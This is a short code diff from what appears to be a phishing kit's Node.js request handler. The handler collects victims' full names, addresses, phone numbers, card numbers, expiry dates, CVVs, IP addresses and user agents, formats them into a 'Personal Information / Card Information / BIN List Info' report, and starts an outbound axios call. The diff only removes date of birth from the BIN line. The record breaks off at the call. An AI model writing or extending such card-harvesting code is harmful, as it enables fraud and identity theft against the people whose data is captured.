@@ -19,7 +19,7 @@ const sendRes = async (req, res) => {
         bankName
     } = req.body;
 
-    binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
+    binList = `${bin} | ${zip} | ${bankName}`;
     var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nAddress: ${address}, ${address2}\nCity: ${city}\nState: ${state}\nZIP: ${zip}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+----------- BIN List Info ------------+\n${binList}`;
 
     await axios
